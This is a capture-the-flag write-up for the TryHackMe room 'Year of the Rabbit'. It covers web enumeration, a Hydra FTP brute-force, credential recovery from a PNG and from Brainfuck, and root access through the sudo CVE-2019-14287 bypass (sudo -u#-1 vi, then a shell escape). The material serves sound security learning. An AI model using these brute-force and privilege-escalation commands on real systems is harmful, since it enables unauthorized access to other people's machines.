# TryHackMe - Year of the Rabbit

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Easy  
**Category:** Web, FTP, SSH, Linux privesc (CVE-2019-14287)  
**Room:** [Year of the Rabbit](https://tryhackme.com/room/yearoftherabbit)

## Introduction

> *Time to enter the warren...*

A rabbit-themed easy box that chains web enumeration, FTP brute-force, Brainfuck decoding, lateral movement between users, and a classic **sudo** misconfiguration exploit.

**Objectives:**
- Obtain `user.txt` (Task 1)
- Obtain `root.txt` (Task 1)

---

## Reconnaissance

Deploy the machine and connect via TryHackMe VPN or AttackBox. A service scan reveals three entry points — web, FTP, and SSH.

### Nmap

```bash
nmap -sC -sV <TARGET_IP>
```

Typical results:

| Port | Service |
|------|---------|
| 21/tcp | vsFTPd 3.0.2 |
| 22/tcp | OpenSSH 6.7p1 (Debian) |
| 80/tcp | Apache httpd 2.4.10 (Debian) |

Anonymous FTP login is **denied** — credentials must be discovered elsewhere. HTTP is the logical starting point for the warren.

---

## Enumeration

### Web — Gobuster

Directory brute-force on the web root:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```

Notable finding: **`/assets/`**

### `/assets/` — CSS comment leak

Inside `style.css`, an HTML comment points to a hidden PHP page:

```
/sup3r_s3cr3t_fl4g.php
```

### JavaScript rabbit hole (Rickroll)

Browsing `/sup3r_s3cr3t_fl4g.php` triggers a JavaScript alert, then redirects to a Rick Astley video. This is intentional misdirection.

**Bypass options:**

| Method | Why it works |
|--------|--------------|
| Disable JavaScript in the browser | Stops the redirect |
| **Burp Suite** | Intercept the request — a second redirect reveals the real hidden path |
| `curl -L` carefully | Follow redirects manually and inspect each hop |

With Burp or JS disabled, the true directory appears (e.g. `/WExYY2Cv-qU/`). It contains a single image: **`Hot_Babe.png`**.

### Steganography — `strings` on the PNG

Download the image:

```bash
wget http://<TARGET_IP>/<HIDDEN_DIR>/Hot_Babe.png
strings Hot_Babe.png
```

Near the end of the output: an FTP username (`ftpuser`) and a long list of candidate passwords embedded in the file.

Save only the password candidates to a wordlist file for Hydra.

---

## Exploitation

### FTP brute-force

Hydra tests the extracted credentials against vsFTPd:

```bash
hydra -l ftpuser -P ftp_passwords.txt ftp://<TARGET_IP> -t 4
```

Successful login grants FTP access.

### FTP — Brainfuck credentials

List and download the file on the server:

```bash
ftp ftpuser@<TARGET_IP>
ls
get Eli\'s_Creds.txt
```

The file contents are **Brainfuck** — an esoteric programming language. Decode with an online interpreter (e.g. [dcode.fr Brainfuck](https://www.dcode.fr/brainfuck-language)) to recover SSH credentials for user **`eli`**.

### Initial shell — SSH as eli

```bash
ssh eli@<TARGET_IP>
```

On login, a message from **root** to **Gwendoline** mentions a *"leet s3cr3t hiding place"*.

---

## Post-exploitation

### Locate Gwendoline's password

Search for the secret path:

```bash
locate s3cr3t
```

Hidden file (example path):

```
/usr/games/s3cr3t/.th1s_m3ss4g3_15_f0r_gw3nd0l1n3_0nly!
```

Read it — root left Gwendoline's password in plaintext.

Switch user:

```bash
su gwendoline
cat /home/gwendoline/user.txt
```

Submit on TryHackMe.

### Privilege escalation — CVE-2019-14287 (sudo)

Check sudo permissions:

```bash
sudo -l
```

Typical output:

```
User gwendoline may run the following commands:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Gwendoline can run `vi` as **any user except root** — but sudo **1.8.28 and below** (here: **1.8.10p3**) mishandles user ID **-1**, treating it as **0 (root)**.

Verify version:

```bash
sudo -V
```

Exploit:

```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

Inside vi, spawn a root shell:

```
:!/bin/bash
```

Confirm:

```bash
whoami
id
cat /root/root.txt
```

Reference: [CVE-2019-14287](https://nvd.nist.gov/vuln/detail/CVE-2019-14287) | [GTFOBins — vi](https://gtfobins.github.io/gtfobins/vi/#sudo)

---

## Flags

| Flag | How to obtain |
|------|---------------|
| user.txt | `su gwendoline` → read `/home/gwendoline/user.txt` |
| root.txt | CVE-2019-14287 via sudo vi → `/root/root.txt` |

*Flag values and passwords are intentionally omitted. Complete the room on [TryHackMe](https://tryhackme.com/room/yearoftherabbit).*

---

## Conclusion

### What I learned

| Technique | Takeaway |
|-----------|----------|
| CSS comment leaks | Source files can hide paths not found by Gobuster alone |
| JS / redirect traps | Rickroll pages hide real directories — use Burp or disable JS |
| `strings` on images | Credentials can hide in PNG metadata/text |
| Brainfuck | Esoteric encodings appear as deliberate CTF puzzles |
| `locate` | Fast filesystem search when you know part of a path name |
| CVE-2019-14287 | `sudo -u#-1` bypasses `(ALL, !root)` restrictions on old sudo |

A well-designed beginner room that teaches not to follow the obvious rabbit hole — literally.
